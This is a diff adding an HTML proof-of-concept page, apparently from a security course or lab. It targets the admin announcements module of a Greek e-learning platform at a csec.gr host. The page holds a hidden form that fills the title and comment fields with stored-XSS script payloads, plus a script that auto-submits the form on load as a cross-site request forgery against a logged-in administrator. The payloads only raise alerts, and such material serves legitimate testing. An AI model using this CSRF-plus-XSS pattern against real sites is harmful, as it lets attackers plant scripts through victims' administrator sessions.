@@ -1,0 +1,46 @@
+
+ <form id='csrf_form' action='http://Eponymous.csec.gr/modules/admin/adminannouncements.php?localize=el' method='post'>
+ <tr><th width='220'>&nbsp;</th><td><b>Επεξεργασια ανακοίνωσης διαχειριστή</b></td></tr>
+                 <tr><th class='left'>Ορατή</th>
+                     <td><input type='checkbox' value='1' name='visible' checked/></td></tr>
+                 <tr><td colspan='2'>&nbsp;</td></tr>
+                 <tr><th class='left'>Τίτλος</th>
+                     <td><input type='text' name='title' value="<script>alert('title')</script>" size='50' class='FormData_InputText' /></td></tr>
+                 <tr><th class='left'>Ανακοίνωση</th>
+                   <td><table class='xinha_editor'>
+                     <tr><td><textarea id='xinha' name='dummy2'></textarea>
+                     </td></tr></table>
+                  </td>
+                     <td><input type='text' name='title' value="<script>alert('content')</script>" size='50' class='FormData_InputText' /></td></tr>
+                 <tr><th class='left'>Σχόλια</th>
+                     <td><input type='text' name='comment' value="<script>alert('comment')</script>" rows='2' cols='50' class='FormData_InputText'/>
+                         </td></tr>
+                 <tr><td colspan='2'>&nbsp;</td></tr>
+                 <tr><th class='left'>Τίτλος (Αγγλικά)</th>
+                     <td><input type='text' name='title_en' value="<script>alert('titleen')</script>" size='50' class='FormData_InputText' /></td></tr>
+                 <tr><th class='left'>Ανακοίνωση (Αγγλικά)</th>
+                     <td><td><input type='text' name='title' value="<script>alert('content')</script>" size='50' class='FormData_InputText' /></td></tr>
+                <tr><th class='left'>Σχόλια (Αγγλικά)</th>
+                  <td><table class='xinha_editor'>
+                            <tr><td><textarea id='xinha_en' name='dummy'></textarea>
+                                    </td></tr>
+                         </table></td></tr>
+                  <td><input type='text' name='comment_en' value="<script>alert('commentEn')</script>" rows='2' cols='50' class='FormData_InputText'/>
+                      </td></tr>
+
+
+
+                      <td><input type='text' name='id' value="7" class='FormData_InputText'/>
+                          </td>
+
+
+               <tr><th class='left'>&nbsp;</th>
+                   <td><input type='text' name='submitAnnouncement' value='Υποβολή' /></td></tr>
+               <tr><td colspan='2'>&nbsp;</td></tr>
+           </tbody>
+        </table>
+  </form>
+<script>
+    var form = document.querySelector("#csrf_form");
+    HTMLFormElement.prototype.submit.call(form);
+</script>
